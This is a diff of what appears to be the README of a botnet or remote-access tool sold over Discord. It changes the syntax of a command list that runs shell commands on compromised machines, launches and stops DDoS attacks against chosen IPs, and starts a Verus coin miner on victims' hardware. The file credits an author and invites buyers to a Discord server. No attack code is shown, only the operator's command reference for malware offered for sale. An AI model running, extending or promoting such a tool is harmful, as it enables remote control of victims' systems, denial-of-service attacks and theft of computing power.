@@ -23,12 +23,12 @@
 * !stopminer              # Stop miner
 
 # Self Commands
-* !kill.ip                   # Close session
-* !shell.ip < cmd >          # Run command and if output is not large send as text if large just send log
-* !ddos.ip < ip >            # Start DDoS Attack
-* !stopddos.ip               # Stop DDoS Attack
-* !miner.ip < wallet >       # Start Verus coin miner
-* !stopminer.ip              # Stop miner
+* !kill.< ip >                   # Close session
+* !shell.< ip > < cmd >          # Run command and if output is not large send as text if large just send log
+* !ddos.< ip > < ip >            # Start DDoS Attack
+* !stopddos.< ip >               # Stop DDoS Attack
+* !miner.< ip > < wallet >       # Start Verus coin miner
+* !stopminer.ip                  # Stop miner
 
 # Credits: batu.sh#9675
 https://discord.gg/vCdPTjD6rZ - Buy? Dm me.
